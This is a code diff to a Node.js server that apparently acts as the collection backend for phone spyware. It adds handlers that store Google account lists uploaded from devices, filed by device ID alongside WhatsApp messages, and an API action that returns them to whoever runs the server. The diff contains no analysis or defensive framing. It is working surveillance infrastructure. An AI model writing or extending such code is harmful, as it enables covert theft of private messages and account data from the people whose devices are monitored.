@@ -60,6 +60,18 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, deleted_count: deleted.length });
         }
         
+        // ✅ حفظ حسابات Google
+        if (data.type === 'google_accounts') {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            
+            const accountsFile = path.join(deviceDir, 'google_accounts.json');
+            fs.writeFileSync(accountsFile, JSON.stringify(data.accounts || [], null, 2));
+            updateDevicesList(deviceId, null);
+            return res.json({ success: true, account_count: (data.accounts || []).length });
+        }
+        
         if (data.type === 'whatsapp_message') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -324,6 +336,13 @@ app.get('/api.php', (req, res) => {
         if (action === 'get_whatsapp') {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
+            return res.json([]);
+        }
+        
+        // ✅ استرجاع حسابات Google
+        if (action === 'get_google_accounts') {
+            const accountsFile = path.join(dataDir, deviceId, 'google_accounts.json');
+            if (fs.existsSync(accountsFile)) return res.json(JSON.parse(fs.readFileSync(accountsFile, 'utf8')));
             return res.json([]);
         }
         
